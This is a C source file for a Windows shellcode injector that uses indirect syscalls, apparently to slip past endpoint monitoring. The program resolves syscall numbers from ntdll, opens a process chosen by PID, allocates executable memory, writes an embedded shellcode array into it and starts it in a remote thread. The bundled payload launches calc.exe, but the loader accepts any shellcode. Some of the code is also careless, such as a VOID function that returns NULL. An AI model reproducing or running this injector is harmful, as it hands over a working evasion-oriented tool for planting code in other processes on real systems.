#include "structs.h"
#include <Windows.h>
#include <stdio.h>

DWORD NtCloseSSN;
DWORD NtOpenProcessSSN;
DWORD NtCreateThreadExSSN;
DWORD NtWriteVirtualMemorySSN;
DWORD NtWaitForSingleObjectSSN;
DWORD NtAllocateVirtualMemorySSN;

UINT_PTR NtCloseSyscall;
UINT_PTR NtOpenProcessSyscall;
UINT_PTR NtCreateThreadExSyscall;
UINT_PTR NtWriteVirtualMemorySyscall;
UINT_PTR NtWaitForSingleObjectSyscall;
UINT_PTR NtAllocateVirtualMemorySyscall;

HMODULE GetMod(
    IN LPCWSTR modName
) {

    HMODULE hModule = NULL;

    info("trying to get a handle to %S", modName);
    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        warn("failed to get a handle to the module, error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        okay("got a handle to the module!");
        info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }

}

VOID IndirectPrelude(
    IN HMODULE hNTDLL,
    IN LPCSTR NtFunction,
    OUT DWORD* SSN,
    OUT UINT_PTR* Syscall
) {

    UINT_PTR NtFunctionAddress = NULL;
    BYTE SyscallOpcode[2] = { 0x0F, 0x05 };

    info("beginning indirect prelude...");
    info("trying to get the address of %s...", NtFunction);
    NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

    if (NtFunctionAddress == NULL) {
        warn("[GetProcAddress] failed, error: 0x%lx", GetLastError());
        return NULL;
    }

    okay("got the address of %s! (0x%p)", NtFunction, NtFunctionAddress);
    *SSN = ((PBYTE)(NtFunctionAddress + 4))[0];
    *Syscall = NtFunctionAddress + 0x12;

    if (memcmp(SyscallOpcode, *Syscall, sizeof(SyscallOpcode)) == 0) {
        okay("syscall signature (0x0F, 0x05) matched, found a valid syscall instruction!");
    }
    else {
        warn("expected syscall signature: 0x0f,0x05 didn't match.");
        return NULL;
    }

    okay("got the SSN of %s (0x%lx)", NtFunction, *SSN);
    printf("\n\t| %s ", NtFunction);
    printf("\n\t|\n\t| ADDRESS\t| 0x%p\n\t| SYSCALL\t| 0x%p\n\t| SSN\t\t| 0x%lx\n\t|____________________________________\n\n", NtFunctionAddress, *Syscall, *SSN);

}

int main(int argc, char** argv) {

    DWORD    PID = 0;
    HMODULE  hNTDLL = NULL;
    NTSTATUS STATUS = NULL;
    PVOID    rBuffer = NULL;
    HANDLE   hThread = NULL;
    HANDLE   hProcess = NULL;

    const UCHAR crowPuke[] = {  "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
                                "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
                                "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
                                "\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
                                "\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
                                "\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
                                "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
                                "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
                                "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
                                "\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
                                "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
                                "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
                                "\x52\xff\xd0" };

    SIZE_T crowPukeSize = sizeof(crowPuke);
    SIZE_T bytesWritten = 0;

    if (argc < 2) {
        warn("usage: %s <process>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    CLIENT_ID CID = { (HANDLE)PID, 0 };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };

    hNTDLL = GetMod(L"NTDLL");
    IndirectPrelude(hNTDLL, "NtOpenProcess", &NtOpenProcessSSN, &NtOpenProcessSyscall);
    IndirectPrelude(hNTDLL, "NtAllocateVirtualMemory", &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
    IndirectPrelude(hNTDLL, "NtWriteVirtualMemory", &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
    IndirectPrelude(hNTDLL, "NtCreateThreadEx", &NtCreateThreadExSSN, &NtCreateThreadExSyscall);
    IndirectPrelude(hNTDLL, "NtWaitForSingleObject", &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
    IndirectPrelude(hNTDLL, "NtClose", &NtCloseSSN, &NtCloseSyscall);

    okay("indirect prelude finished! beginning injection");
    info("getting a handle on the process (%ld)...", PID);
    STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtOpenProcess] failed to get a handle on the process (%ld), error: 0x%x", PID, STATUS);
        return EXIT_FAILURE;
    }
    okay("got a handle to the process!");
    info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

    info("allocating buffer in process memory...");
    STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &crowPukeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions!");

    info("writing payload to allocated buffer...");
    // remove this if u want speed, keep this if u wanna r/masterhacker
    for (int i = 0; i < sizeof(crowPuke); i++) {
        if (i % 16 == 0) {
            printf("\n  ");
        }
        Sleep(1);
        printf(" %02X", crowPuke[i]);
    }
    puts("\n");

    STATUS = NtWriteVirtualMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), &bytesWritten);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("wrote %zu-bytes to allocated buffer!", bytesWritten);

    info("creating thread, beginning execution");
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtCreateThreadEx] failed to create thread, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("thread created!");

    /*--------[CLEANUP & EXIT]--------*/
    info("waiting for thread to finish execution");
    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtWaitForSingleObject] failed to wait for object (hThread), error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("thread finished execution!");

    goto CLEANUP;

CLEANUP:

    info("beginning cleanup...");
    if (hProcess) {
        info("closing handle to process...");
        STATUS = NtClose(hProcess);
        if (!STATUS == STATUS_SUCCESS) {
            warn("[NtClose] failed to close handle, error: 0x%x", STATUS);
            return EXIT_FAILURE;
        }
        okay("closed!");
    }

    if (hThread) {
        info("closing handle to thread...");
        STATUS = NtClose(hThread);
        if (!STATUS == STATUS_SUCCESS) {
            warn("[NtClose] failed to close handle, error: 0x%x", STATUS);
            return EXIT_FAILURE;
        }
        okay("closed!");
    }

    okay("cleanup finished! see ya");
    return EXIT_SUCCESS;

}
